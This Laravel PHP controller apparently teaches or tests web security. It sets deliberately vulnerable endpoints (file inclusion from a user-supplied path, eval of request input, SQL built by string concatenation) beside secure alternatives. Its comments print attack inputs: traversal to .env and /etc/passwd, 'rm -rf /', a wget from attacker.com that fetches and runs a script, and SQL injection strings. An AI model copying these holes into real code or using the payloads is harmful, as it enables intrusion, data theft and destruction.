<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\DB;

/**
 * WARNING: This controller contains INTENTIONALLY INSECURE code for demonstration purposes only.
 * DO NOT use this code in production. It contains security vulnerabilities.
 */
class SecurityTestController extends Controller
{
    /**
     * VULNERABLE: Local File Inclusion (LFI) vulnerability
     *
     * This method demonstrates an insecure file inclusion pattern with dynamic pages.
     * A common scenario: dynamically including page classes and calling methods on them.
     *
     * An attacker could exploit this by passing paths like:
     * - ../../../../.env (to read sensitive environment variables)
     * - ../../../etc/passwd (to read system files)
     * - php://filter/read=convert.base64-encode/resource=../../.env (to bypass some protections)
     *
     * Even if the file doesn't contain valid PHP, the include will output the file contents,
     * potentially exposing sensitive data like database credentials, API keys, etc.
     *
     * SECURE ALTERNATIVE: Use Composer's autoloader instead of direct file inclusion.
     * Laravel already uses Composer autoload, so classes are automatically available.
     */
    public function insecureFileInclusion(Request $request): Response
    {

        // Imagine a request: ?page=../../.env

        $page = $request->input('page', 'HomePage.php');
        $pagePath = base_path('app/Pages/'.$page);

        if (file_exists($pagePath)) {
            include $pagePath;
        }

        // SECURE ALTERNATIVE: Use Composer autoload instead
        // Instead of including files manually, use Composer's autoloader:
        //
        // 1. Add your pages to composer.json autoload section:
        //    "autoload": {
        //        "psr-4": {
        //            "App\\Pages\\": "app/Pages/"
        //        }
        //    }
        //
        // 2. Run: composer dump-autoload
        //
        // 3. Then use the class with proper namespace:
        //    $pageName = $request->input('page', 'HomePage');
        //    $className = "App\\Pages\\{$pageName}";
        //
        //    // Whitelist allowed pages for extra security
        //    $allowedPages = ['HomePage', 'AboutPage', 'ContactPage'];
        //    if (!in_array($pageName, $allowedPages)) {
        //        abort(404);
        //    }
        //
        //    if (class_exists($className)) {
        //        $pageInstance = app($className); // Uses service container
        //        return response($pageInstance->renderOutput());
        //    }
        //
        // This is secure because:
        // - Composer only loads classes from registered namespaces
        // - No file path manipulation is possible (can't use ../../)
        // - Class names are validated against PSR-4 standards
        // - Whitelisting ensures only allowed pages can be loaded

        return response('File inclusion attempted. Check logs for security warnings.');
    }

    /**
     * SECURE: Example of dynamic page loading using Composer autoload
     *
     * This demonstrates the correct way to dynamically load and use page classes
     * without file inclusion vulnerabilities.
     */
    public function secureFileInclusion(Request $request): Response
    {
        $pageName = $request->input('page', 'HomePage');

        // SECURE: Whitelist allowed pages to prevent loading arbitrary classes
        $allowedPages = [
            'HomePage',
            'AboutPage',
            'ContactPage',
            'ServicesPage',
        ];

        if (! in_array($pageName, $allowedPages)) {
            return response('Page not found', 404);
        }

        // SECURE: Use Composer autoload with proper namespace
        // Classes in app/Pages/ are automatically available via Composer
        $className = "App\\Pages\\{$pageName}";

        if (class_exists($className)) {
            // SECURE: Use Laravel's service container for dependency injection
            $pageInstance = app($className);

            if (method_exists($pageInstance, 'renderOutput')) {
                return response($pageInstance->renderOutput());
            }
        }

        // SECURE: This approach prevents:
        // - Directory traversal (../../.env won't work - not a valid class name)
        // - File content exposure (only valid PHP classes can be loaded)
        // - Arbitrary code execution (only whitelisted classes are allowed)

        return response('Page class not found', 404);
    }

    /**
     * VULNERABLE: eval() Code Injection vulnerability
     *
     * This method demonstrates the dangerous use of eval() with user input.
     * An attacker could execute arbitrary PHP code by passing malicious input like:
     * - system('rm -rf /');
     * - file_get_contents('/etc/passwd')
     * - exec('wget http://attacker.com/steal.php -O /tmp/steal.php && php /tmp/steal.php')
     *
     * SECURE ALTERNATIVES: Use Laravel's built-in features instead of eval()
     */
    public function insecureEval(Request $request): Response
    {

        $code = $request->input('code', 'return "default";');

        try {
            $result = eval($code);

            return response('Eval result: '.$result);
        } catch (\Throwable $e) {
            return response('Error: '.$e->getMessage());
        }

        // SECURE ALTERNATIVES:
        //
        // 1. For dynamic class instantiation, use Laravel's service container:
        //    $className = $request->input('class');
        //    if (class_exists($className)) {
        //        $instance = app($className); // Uses dependency injection
        //    }
        //
        // 2. For dynamic method calls, use call_user_func or call_user_func_array:
        //    $method = $request->input('method');
        //    if (method_exists($object, $method)) {
        //        call_user_func([$object, $method], $params);
        //    }
        //
        // 3. For configuration/expressions, use a whitelist approach:
        //    $allowedOperations = ['add', 'subtract', 'multiply', 'divide'];
        //    $operation = $request->input('operation');
        //    if (in_array($operation, $allowedOperations)) {
        //        $result = match($operation) {
        //            'add' => $a + $b,
        //            'subtract' => $a - $b,
        //            // ... etc
        //        };
        //    }
        //
        // 4. For dynamic routes/controllers, use Laravel's routing system:
        //    Route::get('/{controller}/{action}', function ($controller, $action) {
        //        $controllerClass = "App\\Http\\Controllers\\{$controller}Controller";
        //        if (class_exists($controllerClass)) {
        //            return app($controllerClass)->$action();
        //        }
        //    });
        //
        // 5. For serialized data, use Laravel's built-in serialization:
        //    $data = serialize($object); // Safe serialization
        //    $object = unserialize($data); // With validation
        //    // Or use JSON: json_encode/json_decode
    }

    /**
     * SECURE: Example of how to handle dynamic code execution without eval()
     *
     * This demonstrates proper alternatives to eval() using Laravel features.
     */
    public function secureDynamicExecution(Request $request): Response
    {
        $action = $request->input('action');
        $value1 = $request->input('value1', 0);
        $value2 = $request->input('value2', 0);

        // SECURE: Use a whitelist of allowed operations
        $allowedActions = [
            'add' => fn ($a, $b) => $a + $b,
            'subtract' => fn ($a, $b) => $a - $b,
            'multiply' => fn ($a, $b) => $a * $b,
            'divide' => fn ($a, $b) => $b != 0 ? $a / $b : null,
        ];

        if (! isset($allowedActions[$action])) {
            return response('Invalid action. Allowed: '.implode(', ', array_keys($allowedActions)), 400);
        }

        $result = $allowedActions[$action]((float) $value1, (float) $value2);

        return response([
            'action' => $action,
            'result' => $result,
        ]);
    }

    /**
     * SECURE: Dynamic class instantiation without eval()
     *
     * Demonstrates using Laravel's service container and reflection.
     */
    public function secureDynamicClass(Request $request): Response
    {
        $className = $request->input('class');

        // SECURE: Whitelist allowed classes
        $allowedClasses = [
            'App\\Models\\User',
            'App\\Services\\Calculator',
            // Add more allowed classes as needed
        ];

        if (! in_array($className, $allowedClasses)) {
            return response('Class not allowed', 403);
        }

        // SECURE: Use Laravel's service container (handles dependency injection)
        if (class_exists($className)) {
            try {
                $instance = app($className);

                return response('Class instantiated: '.get_class($instance));
            } catch (\Throwable $e) {
                return response('Error instantiating class: '.$e->getMessage(), 500);
            }
        }

        return response('Class does not exist', 404);
    }

    /**
     * VULNERABLE: SQL Injection using whereRaw() with user input
     *
     * This method demonstrates SQL injection vulnerability when using whereRaw()
     * with unvalidated user input from request parameters.
     *
     * Attack examples that WOULD work:
     * - ?email=' OR '1'='1 (bypass authentication, return all users)
     * - ?email=' OR 1=1 -- (comment out rest of query)
     * - ?email=' UNION SELECT email, password FROM users -- (extract sensitive data)
     * - ?email='; UPDATE users SET email='hacked@evil.com' WHERE 1=1; -- (modify data)
     * - ?email=' OR (SELECT COUNT(*) FROM users) > 0 -- (information disclosure)
     * - ?email=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' -- (blind SQL injection)
     *
     * Note: TRUNCATE won't work in WHERE clause (it's a standalone DDL statement).
     * DROP TABLE also typically won't work in WHERE clause context.
     * But UPDATE, DELETE, and data extraction attacks are very real threats.
     */
    public function insecureWhereRaw(Request $request): Response
    {
        // Imagine input: ?email='; TRUNCATE users; --

        $email = $request->get('email');

        // VULNERABLE: Direct string concatenation allows SQL injection
        $user = User::whereRaw("email = '".$email."'")->first();

        // Even more dangerous: Multiple whereRaw concatenations
        // $users = User::whereRaw("email = '" . $email . "' AND name = '" . $name . "'")->get();

        // SECURE ALTERNATIVE: Use parameterized where() methods
        // See secureWhere() method below

        return response([
            'vulnerable' => true,
            'user' => $user,
            'warning' => 'This query is vulnerable to SQL injection!',
        ]);
    }

    /**
     * SECURE: Proper use of where() with request parameters
     *
     * This demonstrates the secure way to query the database using Eloquent's
     * parameterized where() methods, which automatically escape user input.
     */
    public function secureWhere(Request $request): Response
    {
        $email = $request->get('email');
        $name = $request->get('name');

        // SECURE: Use where() with parameter binding - automatically escapes input
        $query = User::query();

        if ($email) {
            $query->where('email', $email); // Parameterized and safe
        }

        if ($name) {
            $query->where('name', 'LIKE', '%'.$name.'%'); // Still safe - Eloquent escapes it
        }

        $users = $query->get();

        // SECURE ALTERNATIVES:
        //
        // 1. Using where() with operators (recommended):
        //    User::where('email', '=', $email)->get();
        //    User::where('name', 'LIKE', "%{$name}%")->get();
        //
        // 2. Using where() with array syntax:
        //    User::where([
        //        ['email', '=', $email],
        //        ['name', 'LIKE', "%{$name}%"]
        //    ])->get();
        //
        // 3. If you MUST use raw SQL, use parameter binding:
        //    User::whereRaw('email = ?', [$email])->get();
        //    DB::select('SELECT * FROM users WHERE email = ?', [$email]);
        //
        // 4. Using Eloquent's query builder methods:
        //    User::whereEmail($email)->whereName($name)->get();
        //
        // All of these are secure because:
        // - Eloquent automatically escapes and parameterizes queries
        // - User input is treated as data, not as SQL code
        // - Prevents SQL injection attacks

        return response([
            'secure' => true,
            'users' => $users,
            'message' => 'This query is secure - uses parameterized queries',
        ]);
    }

    /**
     * VULNERABLE: SQL Injection using DB::raw() incorrectly
     *
     * Demonstrates another common mistake with raw SQL.
     */
    public function insecureRawQuery(Request $request): Response
    {
        $search = $request->get('search');

        // VULNERABLE: Using DB::raw() with user input directly
        $users = User::where(DB::raw("CONCAT(name, ' ', email)"), 'LIKE', '%'.$search.'%')
            ->get();

        // Even worse: Direct raw query with concatenation
        // $users = DB::select("SELECT * FROM users WHERE name LIKE '%" . $search . "%'");

        // SECURE ALTERNATIVE:
        // Use whereRaw() with parameter binding:
        // User::whereRaw("CONCAT(name, ' ', email) LIKE ?", ["%{$search}%"])->get();

        return response([
            'vulnerable' => true,
            'users' => $users,
        ]);
    }

    /**
     * SECURE: Using whereRaw() correctly with parameter binding
     *
     * Shows how to use whereRaw() safely when you need raw SQL.
     */
    public function secureWhereRaw(Request $request): Response
    {
        $search = $request->get('search');
        $minAge = $request->get('min_age');

        // SECURE: Using whereRaw() with parameter binding (question marks)
        $query = User::query();

        if ($search) {
            // SECURE: Parameter binding prevents SQL injection
            $query->whereRaw("CONCAT(name, ' ', email) LIKE ?", ["%{$search}%"]);
        }

        if ($minAge) {
            // SECURE: Even with calculations, use parameter binding
            $query->whereRaw('YEAR(CURDATE()) - YEAR(created_at) >= ?', [(int) $minAge]);
        }

        $users = $query->get();

        // SECURE: Alternative using DB::select() with parameters
        // $users = DB::select(
        //     "SELECT * FROM users WHERE name LIKE ? AND age >= ?",
        //     ["%{$search}%", (int) $minAge]
        // );

        return response([
            'secure' => true,
            'users' => $users,
            'message' => 'whereRaw() used correctly with parameter binding',
        ]);
    }

    /**
     * Additional insecure patterns for demonstration
     */
    public function otherInsecurePatterns(Request $request): Response
    {
        // VULNERABLE: XSS (Cross-Site Scripting)
        $userInput = $request->input('comment');
        // BAD: return response($userInput); // Unescaped output
        // GOOD: Use Blade escaping: {{ $userInput }} or e($userInput)

        // VULNERABLE: Command Injection
        $command = $request->input('command');
        // BAD: exec($command);
        // GOOD: Use Laravel's Process facade with proper validation

        return response('Other insecure patterns demonstrated. Check code comments.');
    }
}
